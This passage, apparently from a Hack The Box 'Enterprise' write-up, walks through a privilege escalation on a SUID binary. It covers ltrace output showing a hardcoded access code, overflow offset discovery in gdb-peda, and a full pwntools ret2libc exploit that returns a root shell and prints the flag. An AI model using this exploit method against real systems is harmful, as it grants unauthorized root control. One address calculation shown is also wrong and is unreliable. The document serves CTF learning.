+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>find / <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/bin/gpasswd
+/usr/bin/newuidmap
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/newgidmap
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/chsh
+/bin/umount
+/bin/su
+/bin/ping
+/bin/ntfs-3g
+/bin/mount
+/bin/lcars
+/bin/fusermount
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I transferred lcars binary to my box.
+Checking for the platform for the binary:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>file lcars
+lcars: ELF 32-bit LSB pie executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for </span>GNU/Linux 2.6.32, BuildID[sha1]<span class="o">=</span>88410652745b0a94421ce22ea4278a8eaea8db57, not stripped
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Figuring out what the binary does:
+Running ltrace on lcars:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>ltrace ./lcars
+__libc_start_main<span class="o">(</span>0x565f0c91, 1, 0xffba2804, 0x565f0d30 &lt;unfinished ...&gt;
+setresuid<span class="o">(</span>0, 0, 0, 0x565f0ca8<span class="o">)</span>                                                                                        <span class="o">=</span> 0
+puts<span class="o">(</span><span class="s2">"Enter Bridge Access Code: "</span>Enter Bridge Access Code:
+<span class="o">)</span>                                                                                    <span class="o">=</span> 27
+fflush<span class="o">(</span>0xf7f27d20<span class="o">)</span>                                                                                                    <span class="o">=</span> 0
+fgets<span class="o">(</span>asdf
+<span class="s2">"asdf</span><span class="se">\n</span><span class="s2">"</span>, 9, 0xf7f27580<span class="o">)</span>                                                                                        <span class="o">=</span> 0xffba2737
+strcmp<span class="o">(</span><span class="s2">"asdf</span><span class="se">\n</span><span class="s2">"</span>, <span class="s2">"picarda1"</span><span class="o">)</span>                                                                                          <span class="o">=</span> <span class="nt">-1</span>
+puts<span class="o">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">Invalid Code</span><span class="se">\n</span><span class="s2">Terminating Consol"</span>...
+Invalid Code
+Terminating Console
+
+<span class="o">)</span>                                                                         <span class="o">=</span> 35
+fflush<span class="o">(</span>0xf7f27d20<span class="o">)</span>                                                                                                    <span class="o">=</span> 0
+<span class="nb">exit</span><span class="o">(</span>0 &lt;no <span class="k">return</span> ...&gt;
++++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>It tries to compare given input to <code class="language-plaintext highlighter-rouge">picarda1</code>.
+It also uses strcmp() which is vulnerable to buffer-overflow. Still I wan’t able to exploit that part of code.</p>
+
+<p>Checking for ASLR:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /proc/sys/kernel/randomize_va_space
+0
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>When I run the binary now, there’s another prompt for user input:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>./lcars
+Enter Bridge Access Code: picarda1
+                 _______ _______  ______ _______
+          |      |       |_____| |_____/ |______
+          |_____ |_____  |     | |    <span class="se">\_</span> ______|
+
+Welcome to the Library Computer Access and Retrieval System
+LCARS Bridge Secondary Controls <span class="nt">--</span> Main Menu:
+
+1. Navigation
+2. Ships Log
+3. Science
+4. Security
+5. StellaCartography
+6. Engineering
+7. Exit
+Waiting <span class="k">for </span>input:
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Let’s see the code after we give a valid Access code:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre></td> --><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">main_menu</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">uint</span> <span class="n">local_d8</span> <span class="p">[</span><span class="mi">52</span><span class="p">];</span>
+  
+  <span class="n">local_d8</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">startScreen</span><span class="p">();</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"LCARS Bridge Secondary Controls -- Main Menu: </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"1. Navigation"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"2. Ships Log"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"3. Science"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"4. Security"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"5. StellaCartography"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"6. Engineering"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"7. Exit"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Waiting for input: "</span><span class="p">);</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00010f92</span><span class="p">,</span><span class="n">local_d8</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_d8</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Could not recover jumptable at 0x0001097e. Too many branches */</span>
+                    <span class="cm">/* WARNING: Treating indirect jump as call */</span>
+    <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">code</span> <span class="o">*</span><span class="p">)((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_000110c4</span> <span class="o">+</span> <span class="n">local_d8</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)))();</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">unable</span><span class="p">();</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>This code takes user input with scanf() which is also dangerous.
+The only option which prints the output with printf() in this binary is option 4-Security.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'print("picarda1\n4\n"+ "A"*10 +"\n")'</span>| ./lcars
+LCARS Bridge Secondary Controls <span class="nt">--</span> Main Menu:
+
+1. Navigation
+2. Ships Log
+3. Science
+4. Security
+5. StellaCartography
+6. Engineering
+7. Exit
+Waiting <span class="k">for </span>input:
+Disable Security Force Fields
+Enter Security Override:
+Rerouting Tertiary EPS Junctions: AAAAAAAAAA
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Checking for other protections:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : ENABLED
+RELRO     : Partial
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>PIE</strong>(Position Independent Executables) is enabled which means addresses in the binary will be randomized. So, there’s not much scope for ROP or jumping to specific addresses in the memory. 
+Since NX/DEP is disabled, we can write on the stack and jump straight into it. I’ll try Ret-2-libc as it’s much predictable and somewhat easy. For Ret-2-libc everything I need will be taken from shared library and not the binary, so we’re good to go.</p>
+
+<p>You can see <a href="https://0xcaretaker.github.io/posts/October/#beyond-root">October-Ret2libc</a> for more detailed look on Return-to-libc.</p>
+
+<p>(Note: Essentially ret2libc is somewhat a ROP exploit, since you create a new stackframe to call the system function by returning to the libc library and circumventing a non-executable stack.A ROP in general works similar, you jump to fragments of code (called gadgets) that return at some point and “build” yourself the code you want to execute by combining those fragments. You literally program the code you want to execute, creating new routines that were not in the code before. ret2libc utilizes the system function to get a shell.)</p>
+<h2 id="finding-offset">Finding offset</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre></td> --><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>pattern create 500
+<span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'</span>
+
+gdb-peda<span class="nv">$ </span>r
+Enter Bridge Access Code:
+picarda1
+Waiting <span class="k">for </span>input:
+4
+Disable Security Force Fields
+Enter Security Override:
+AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="nv">$A</span>%nA%CA%-A%<span class="o">(</span>A%DA%<span class="p">;</span>A%<span class="o">)</span>A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs<span class="nv">$AsnAsCAs</span><span class="nt">-As</span><span class="o">(</span>AsDAs<span class="p">;</span>As<span class="o">)</span>AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A
+<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
+EAX: 0x216
+EBX: 0x73254125 <span class="o">(</span><span class="s1">'%A%s'</span><span class="o">)</span>
+ECX: 0x0
+EDX: 0x0
+ESI: 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
+EDI: 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
+EBP: 0x41422541 <span class="o">(</span><span class="s1">'A%BA'</span><span class="o">)</span>
+ESP: 0xffffd110 <span class="o">(</span><span class="s2">"nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs</span><span class="nv">$A</span><span class="s2">"</span>...<span class="o">)</span>
+EIP: 0x25412425 <span class="o">(</span><span class="s1">'%$A%'</span><span class="o">)</span>
+EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
+
+gdb-peda<span class="nv">$ </span>pattern offset %<span class="nv">$A</span>%
+%<span class="nv">$A</span>% found at offset: 212
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="confirming-the-offset">Confirming the offset</h2>
+<p>I’ll generate a 212 A’s junk and 4 B’s and will see if all the B’s end up on EIP.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'print("A"*212 + "B"*4)'</span>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB
+</pre></td></tr></tbody></table></code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre></td> --><td class="rouge-code"><pre>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
+EAX: 0xfa
+EBX: 0x41414141 <span class="o">(</span><span class="s1">'AAAA'</span><span class="o">)</span>
+ECX: 0x0
+EDX: 0x0
+ESI: 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
+EDI: 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
+EBP: 0x41414141 <span class="o">(</span><span class="s1">'AAAA'</span><span class="o">)</span>
+ESP: 0xffffd110 <span class="nt">--</span><span class="o">&gt;</span> 0x0
+EIP: 0x42424242 <span class="o">(</span><span class="s1">'BBBB'</span><span class="o">)</span>
+EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
+<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
+Invalid <span class="nv">$PC</span> address: 0x42424242
+<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
+0000| 0xffffd110 <span class="nt">--</span><span class="o">&gt;</span> 0x0
+0004| 0xffffd114 <span class="nt">--</span><span class="o">&gt;</span> 0xf7dc6e48 <span class="nt">--</span><span class="o">&gt;</span> 0x5189
+0008| 0xffffd118 <span class="nt">--</span><span class="o">&gt;</span> 0x6970001a
+0012| 0xffffd11c <span class="o">(</span><span class="s2">"carda1"</span><span class="o">)</span>
+0016| 0xffffd120 <span class="nt">--</span><span class="o">&gt;</span> 0xf7003161
+0020| 0xffffd124 <span class="nt">--</span><span class="o">&gt;</span> 0x56558000 <span class="nt">--</span><span class="o">&gt;</span> 0x2ef0
+0024| 0xffffd128 <span class="nt">--</span><span class="o">&gt;</span> 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
+0028| 0xffffd12c <span class="nt">--</span><span class="o">&gt;</span> 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
+<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x42424242 <span class="k">in</span> ?? <span class="o">()</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="getting-addresses">Getting Addresses</h2>
+<p>Return-to-libc attack requires addresses of system, exit (Return address) and /bin/sh.
+We’ll take addresses from the libc shared library present on enterprise.</p>
+
+<ul>
+  <li>Finding address of libc with <code class="language-plaintext highlighter-rouge">ldd</code>:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre>www-data@enterprise:/<span class="nv">$ </span>ldd /bin/lcars
+      linux-gate.so.1 <span class="o">=&gt;</span>  <span class="o">(</span>0xf7ffc000<span class="o">)</span>
+      libc.so.6 <span class="o">=&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xf7e32000<span class="o">)</span>
+      /lib/ld-linux.so.2 <span class="o">(</span>0x56555000<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>Getting offsets for system, exit and /bin/sh with <code class="language-plaintext highlighter-rouge">gdb</code>, since <code class="language-plaintext highlighter-rouge">readelf</code> isn’t present on enterprise.
+Trying to get system address when the program isn’t running will result in errors:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> p &amp;system
+No symbol table is loaded.  Use the <span class="s2">"file"</span> command.
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>Run it once or add breakpoint somewhere to access addresses:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> p &amp;system
+<span class="nv">$1</span> <span class="o">=</span> <span class="o">(</span>&lt;text variable, no debug info&gt; <span class="k">*</span><span class="o">)</span> 0xf7e4c060 &lt;system&gt;
+<span class="o">(</span>gdb<span class="o">)</span> p <span class="nb">exit</span>
+<span class="nv">$5</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7e3faf0 &lt;<span class="nb">exit</span><span class="o">&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>&amp;function and straight function specified. Both works.</p>
+
+<p>I get /bin/sh address with <code class="language-plaintext highlighter-rouge">find</code> command in gdb. It’s syntax is <code class="language-plaintext highlighter-rouge">find [/SIZE-CHAR] [/MAX-COUNT] START-ADDRESS, END-ADDRESS, EXPR1 [, EXPR2, ...]</code>. I’ll use <code class="language-plaintext highlighter-rouge">find libc-address,+bytes,string</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> find 0xf7e32000,+10000000, <span class="s2">"/bin/sh"</span>
+0xf7f70a0f
+warning: Unable to access 16000 bytes of target memory at 0xf7fca797, halting search.
+1 pattern found.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Note: If you’re not able to get “/bin/sh” address, you can add a breakpoint in main, run the binary then try to get the address.</p>
+
+<p>and for this libc base the final addresses are:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre>system  address 
+				<span class="o">=</span> 0xf7e4c060
+<span class="nb">exit    </span>address 
+				<span class="o">=</span> 0xf7e3faf0
+/bin/sh address 
+				<span class="o">=</span> 0xf7f70a0f
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>You can calculate the final address like this:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'print(hex(0xf7e32000 + 0xf7e4c060))'</span>
+0xb7f74a0b
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Buffer overflow goes: <code class="language-plaintext highlighter-rouge">JUNK + SYSTEM (overwrite ret address) + EXIT (add next return address) + "/bin/sh" (arguments)</code>.
+That junk can be just NOPS (No operations ~ <code class="language-plaintext highlighter-rouge">\x90</code>), I’m using bunch of A’s.</p>
+
+<p>The exploit will still not work since /bin/sh address is <code class="language-plaintext highlighter-rouge">0xf7f70a0f</code> which contains <code class="language-plaintext highlighter-rouge">0x0a</code> byte which is newline.</p>
+
+<p>I’ll try finding addresses contains <code class="language-plaintext highlighter-rouge">sh</code> string:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> find 0xf7e32000,+10000000, <span class="s2">"sh"</span>
+0xf7f6ddd5
+0xf7f6e7e1
+0xf7f70a14
+0xf7f72582
+warning: Unable to access 16000 bytes of target memory at 0xf7fc8485, halting search.
+4 patterns found.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">0xf7f6ddd5</code> address works in this case after trial and error.</p>
+<h2 id="exploit">Exploit</h2>
+<p>Since ASLR isn’t enabled, we can do:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td> --><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"enterprise.htb"</span><span class="p">,</span><span class="mi">32812</span><span class="p">)</span>
+
+<span class="n">offset</span>  <span class="o">=</span> <span class="mi">212</span>
+<span class="n">junk</span>    <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span>
+<span class="n">system</span>  <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xf7e4c060</span><span class="p">)</span>
+<span class="nb">exit</span>    <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xf7e3faf0</span><span class="p">)</span>
+<span class="n">shell</span>   <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xf7f6ddd5</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span> <span class="nb">exit</span> <span class="o">+</span> <span class="n">shell</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter Bridge Access Code:"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"picarda1"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Waiting for input:"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter Security Override:"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Running the script, I got root shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td> --><td class="rouge-code"><pre>root@TheCaretaker:~<span class="nv">$ </span>python3 script.py
+<span class="o">[</span>+] Opening connection to enterprise.htb on port 32812: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+
+<span class="nv">$ </span><span class="nb">whoami
+</span>root
+<span class="nv">$ </span><span class="nb">cat</span> /root/root.txt
+cf941b35b016b3d195639b748ddee717
+</pre></td></tr></tbody></table></code></pre></div></div>
+:ET
